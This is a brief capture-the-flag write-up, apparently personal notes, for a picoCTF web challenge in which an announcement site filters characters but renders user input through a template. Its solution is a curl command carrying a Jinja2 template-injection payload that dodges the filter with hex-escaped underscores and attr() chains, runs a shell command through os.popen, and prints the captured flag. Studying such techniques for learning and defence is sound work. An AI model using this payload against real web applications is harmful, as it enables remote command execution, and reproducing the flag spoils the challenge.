#### Descripción 

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:61844/)!
#### Solución
```bash
rosyperez@MacBookAir notas-hacking % curl -X POST http://shape-facility.picoctf.net:61844//announce \

  -d "content={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}"

  

                    <!doctype html>

                    <h1 style="font-size:100px;" align="center">picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}</h1>**%**                                                                           rosyperez@MacBookAir notas-hacking %
```
#### Notas

#### Referencias
